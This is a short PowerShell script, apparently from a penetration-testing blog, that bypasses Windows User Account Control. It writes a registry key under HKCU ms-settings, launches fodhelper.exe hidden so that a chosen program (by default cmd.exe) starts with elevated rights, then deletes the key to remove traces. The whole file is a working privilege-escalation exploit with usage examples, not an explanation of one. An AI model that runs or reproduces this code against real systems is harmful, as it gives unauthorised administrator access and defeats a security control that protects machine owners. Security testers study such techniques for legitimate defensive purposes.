<#
.SYNOPSIS  
    This script can bypass User Access Control (UAC) via fodhelper.exe
　
    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts 
    an elevated command prompt. 
    　
.NOTES  
    Function   : FodhelperUACBypass
    File Name  : FodhelperUACBypass.ps1 
    Author     : netbiosX. - pentestlab.blog 
　
.LINKS          
    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
　
.EXAMPLE  
　
     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass 
　
     Load specific application:
     FodhelperUACBypass -program "cmd.exe"
     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
#>

function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )
　
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
　
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
　
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
　
}